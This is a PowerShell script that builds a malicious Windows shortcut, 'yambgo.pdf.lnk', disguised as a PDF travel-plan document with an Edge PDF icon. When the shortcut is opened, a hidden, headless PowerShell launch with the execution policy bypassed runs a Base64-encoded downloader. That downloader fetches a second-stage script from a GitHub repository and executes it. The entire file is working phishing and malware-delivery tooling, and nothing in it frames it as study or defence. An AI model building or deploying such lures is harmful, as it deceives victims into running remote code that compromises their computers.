# build_nabgo.ps1 - builds yambgo.pdf.lnk (conhost + EncodedCommand short downloader)
# Target: conhost.exe --headless powershell.exe -EncodedCommand <b64_downloader>
# Short downloader fetches x.ps1 from GitHub, x.ps1 runs full bootstrap
# Icon: msedge.exe,11 PDF
# Repo: rotalbilly5-sketch/Dream
$shortCmd = '[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/x.ps1'')'
$bytes = [Text.Encoding]::Unicode.GetBytes($shortCmd)
$b64 = [Convert]::ToBase64String($bytes)
$pwshPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$argsStr = "--headless $pwshPath -NoP -EP Bypass -EncodedCommand $b64"
$lnkPath = Join-Path $PSScriptRoot 'yambgo.pdf.lnk'
Remove-Item $lnkPath -Force -EA 0
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "C:\Windows\System32\conhost.exe"
$lnk.Arguments = $argsStr
$lnk.IconLocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,11"
$lnk.Description = "Travel Plan Document"
$lnk.WindowStyle = 7
$lnk.Save()
$v = $wsh.CreateShortcut($lnkPath)
"LNK: $($v.TargetPath) | Args: $($v.Arguments.Length) chars | Icon: $($v.IconLocation)"
